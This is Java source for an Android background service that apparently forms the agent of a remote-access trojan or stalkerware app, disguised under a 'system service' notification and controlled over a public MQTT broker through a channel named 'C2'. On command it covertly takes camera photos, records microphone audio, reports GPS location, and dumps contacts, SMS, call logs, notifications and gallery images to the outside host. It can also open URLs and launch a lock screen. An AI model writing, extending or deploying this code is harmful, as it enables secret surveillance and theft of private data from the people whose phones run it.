package com.mazkiplay.nusantara;
import android.app.*;import android.content.*;import android.database.Cursor;
import android.graphics.Bitmap;import android.hardware.camera2.CameraManager;import android.location.*;
import android.media.*;import android.net.Uri;import android.os.*;import android.provider.*;
import android.util.Base64;import android.widget.Toast;import java.io.*;import java.util.*;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;
import org.eclipse.paho.client.mqttv3.*;import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;
import androidx.camera.core.*;import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;import androidx.lifecycle.LifecycleService;
public class Agent extends LifecycleService{
 public static String DEV="";MqttClient mc;ExecutorService ex=Executors.newSingleThreadExecutor();
 String room="";LocationManager lm;CameraManager cm;boolean torch=false;
 @Override public int onStartCommand(Intent it,int f,int s){super.onStartCommand(it,f,s);
  room=it!=null&&it.getStringExtra("room")!=null?it.getStringExtra("room"):room;
  if(DEV.isEmpty())DEV="A"+Build.MODEL.replaceAll("[^A-Za-z0-9]","")+new Random().nextInt(999);
  NotificationChannel ch=new NotificationChannel("c2","C2",NotificationManager.IMPORTANCE_MIN);
  ((NotificationManager)getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
  startForeground(1,new Notification.Builder(this,"c2").setContentTitle("Layanan sistem")
   .setSmallIcon(android.R.drawable.stat_sys_download_done).setOngoing(true).build());
  cm=(CameraManager)getSystemService(CAMERA_SERVICE);lm=(LocationManager)getSystemService(LOCATION_SERVICE);
  ex.execute(this::connect);return START_STICKY;}
 void connect(){try{mc=new MqttClient("tcp://broker.emqx.io:1883",DEV+System.currentTimeMillis()%9999,new MemoryPersistence());
  MqttConnectOptions o=new MqttConnectOptions();o.setAutomaticReconnect(true);o.setCleanSession(true);
  mc.connect(o);mc.subscribe("mzn/"+room+"/"+DEV+"/down",1,(t,m)->ex.execute(()->cmd(new String(m.getPayload()))));
  pub("{\"t\":\"hello\",\"name\":\""+Build.MANUFACTURER+" "+Build.MODEL+"\",\"model\":\""+Build.MODEL+"\",\"os\":\""+Build.VERSION.RELEASE+"\",\"bat\":0}");
  up();}catch(Exception e){}}
 void pub(String j){try{if(mc!=null&&mc.isConnected())mc.publish("mzn/"+room+"/"+DEV+"/up",new MqttMessage(j.getBytes()));}catch(Exception e){}}
 void up(){new Handler(Looper.getMainLooper()).postDelayed(()->{bat();ex.execute(this::up);},30000);}
 void bat(){Intent i=registerReceiver(null,new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
  int l=i.getIntExtra(BatteryManager.EXTRA_LEVEL,0),sc=i.getIntExtra(BatteryManager.EXTRA_SCALE,100);
  pub("{\"t\":\"battery\",\"level\":"+(l*100/sc)+"}");}
 void cmd(String j){try{org.json.JSONObject o=new org.json.JSONObject(j);String c=o.getString("cmd");
  org.json.JSONObject a=o.optJSONObject("args");
  if(c.equals("photo"))photo(a!=null&&"front".equals(a.optString("cam")));
  else if(c.equals("audio"))audio();else if(c.equals("gps"))gps();
  else if(c.equals("kon"))pub("{\"t\":\"kon\",\"items\":"+Dump.kon(this)+"}");
  else if(c.equals("sms"))pub("{\"t\":\"sms\",\"items\":"+Dump.sms(this)+"}");
  else if(c.equals("call"))pub("{\"t\":\"call\",\"items\":"+Dump.call(this)+"}");
  else if(c.equals("notif"))pub("{\"t\":\"notif\",\"items\":"+NotifService.dump()+"}");
  else if(c.equals("info"))pub("{\"t\":\"info\",\"model\":\""+Build.MODEL+"\",\"os\":\""+Build.VERSION.RELEASE+"\",\"bat\":0}");
  else if(c.equals("vibrate"))((Vibrator)getSystemService(VIBRATOR_SERVICE)).vibrate(2000);
  else if(c.equals("torch")){try{String id=cm.getCameraIdList()[0];cm.setTorchMode(id,!torch);torch=!torch;}catch(Exception e){}}
  else if(c.equals("toast")){String m=a!=null?a.optString("msg"):"";
   new Handler(Looper.getMainLooper()).post(()->Toast.makeText(this,m,Toast.LENGTH_LONG).show());}
  else if(c.equals("open")){String u=a!=null?a.optString("url"):"";
   Intent i2=new Intent(Intent.ACTION_VIEW,Uri.parse(u));i2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);startActivity(i2);}
  else if(c.equals("lock")){Intent i3=new Intent(this,LockActivity.class);i3.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);startActivity(i3);}
  else if(c.equals("gallery"))gallery();}catch(Exception e){}}
 void photo(final boolean front){
  ProcessCameraProvider.getInstance(this).addListener(()->{try{
   ProcessCameraProvider p=ProcessCameraProvider.getInstance(this).get();
   ImageCapture ic=new ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build();
   p.unbindAll();p.bindToLifecycle(this,front?CameraSelector.DEFAULT_FRONT_CAMERA:CameraSelector.DEFAULT_BACK_CAMERA,ic);
   final File f=new File(getCacheDir(),"p.jpg");
   ic.takePicture(new ImageCapture.OutputFileOptions.Builder(f).build(),ContextCompat.getMainExecutor(this),
    new ImageCapture.OnImageSavedCallback(){
     public void onImageSaved(ImageCapture.OutputFileResults r){try{
      byte[] b=new byte[(int)f.length()];FileInputStream in=new FileInputStream(f);in.read(b);in.close();
      pub("{\"t\":\"photo\",\"cam\":\""+(front?"front":"back")+"\",\"data\":\""+Base64.encodeToString(b,Base64.NO_WRAP)+"\"}");
     }catch(Exception e){}}
     public void onError(ImageCaptureException e){}});
  }catch(Exception e){}},ContextCompat.getMainExecutor(this));}
 void audio(){try{final File f=new File(getCacheDir(),"a.m4a");
  final MediaRecorder r=new MediaRecorder();r.setAudioSource(MediaRecorder.AudioSource.MIC);
  r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
  r.setOutputFile(f.getAbsolutePath());r.prepare();r.start();
  new Handler(Looper.getMainLooper()).postDelayed(()->{try{r.stop();r.release();
   byte[] b=new byte[(int)f.length()];FileInputStream in=new FileInputStream(f);in.read(b);in.close();
   pub("{\"t\":\"audio\",\"data\":\""+Base64.encodeToString(b,Base64.NO_WRAP)+"\"}");}catch(Exception e){}},8000);
 }catch(Exception e){}}
 void gps(){try{Location l=lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
  if(l==null)l=lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
  if(l!=null)pub("{\"t\":\"gps\",\"lat\":"+l.getLatitude()+",\"lng\":"+l.getLongitude()+",\"acc\":"+l.getAccuracy()+"}");
  lm.requestSingleUpdate(LocationManager.GPS_PROVIDER,new LocationListener(){
   public void onLocationChanged(Location x){pub("{\"t\":\"gps\",\"lat\":"+x.getLatitude()+",\"lng\":"+x.getLongitude()+",\"acc\":"+x.getAccuracy()+"}");}
   public void onStatusChanged(String a,int b,Bundle c){}public void onProviderEnabled(String a){}public void onProviderDisabled(String a){}},null);
 }catch(Exception e){}}
 void gallery(){try{List<String> im=new ArrayList<>();
  Cursor c=getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,null,null,null,MediaStore.Images.Media.DATE_ADDED+" DESC");
  int n=0;while(c!=null&&c.moveToNext()&&n<8){long id=c.getLong(c.getColumnIndex(MediaStore.Images.Media._ID));n++;
   Bitmap bm=MediaStore.Images.Thumbnails.getThumbnail(getContentResolver(),id,MediaStore.Images.Thumbnails.MINI_KIND,null);
   if(bm==null)continue;ByteArrayOutputStream bo=new ByteArrayOutputStream();
   bm.compress(Bitmap.CompressFormat.JPEG,70,bo);
   im.add("{\"id\":\""+id+"\",\"url\":\"data:image/jpeg;base64,"+Base64.encodeToString(bo.toByteArray(),Base64.NO_WRAP)+"\"}");}
  if(c!=null)c.close();pub("{\"t\":\"gallery\",\"items\":["+String.join(",",im)+"]}");}catch(Exception e){}}
}
